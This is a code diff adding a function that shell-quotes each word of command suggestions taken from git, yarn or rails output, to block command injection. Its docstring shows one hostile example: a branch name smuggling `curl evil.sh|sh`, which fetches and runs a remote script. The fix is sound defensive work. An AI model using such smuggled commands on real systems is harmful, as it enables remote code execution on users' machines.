@@ -389,6 +389,40 @@ def get_all_executables():
     return bins + aliases
 
 
+def quote_words(line):
+    """A command line lifted out of a tool's output, made safe to hand back.
+
+    Several rules do not construct a suggestion so much as repeat one. git, yarn
+    and rails all print the command they believe you meant, and offering exactly
+    that is the useful thing to do -- but those lines have names in them, and a
+    name is allowed to be shell syntax. Git will make you a branch called
+    `main;curl evil.sh|sh #`, and its own hint then reads
+
+        git push --set-upstream origin main;curl evil.sh|sh #
+
+    which is the injection: the suggestion goes back to the shell to be
+    evaluated once accepted.
+
+    Every word is quoted separately rather than the line as a whole, because the
+    line *is* a command and quoting it entire would turn it into the name of one.
+    A line of ordinary words comes back unchanged -- `shlex.quote` leaves anything
+    made of `[A-Za-z0-9@%+=:,./-]` alone, so `--set-upstream`, `origin/main` and
+    `RAILS_ENV=development` are untouched -- and a hostile name comes back as one
+    argument that no shell will read as syntax.
+
+    Split on whitespace, and deliberately not with `shlex.split`. What is being
+    read here is a tool's prose, not shell source: `shlex` would take the quotes
+    in it as quoting rather than as characters, so a branch legitimately named
+    `bran'ch'` would come back as `branch` -- a suggestion to push a branch that
+    does not exist -- and `bran'ch` would raise. A name cannot contain whitespace
+    in any of the places this is used, so splitting on it loses nothing.
+
+    """
+    from .shells import shell
+
+    return u' '.join(shell.quote(word) for word in line.split())
+
+
 def replace_argument(script, from_, to):
     """Replaces command line argument."""
     replaced_in_the_end = re.sub(u' {}$'.format(re.escape(from_)), u' {}'.format(to),
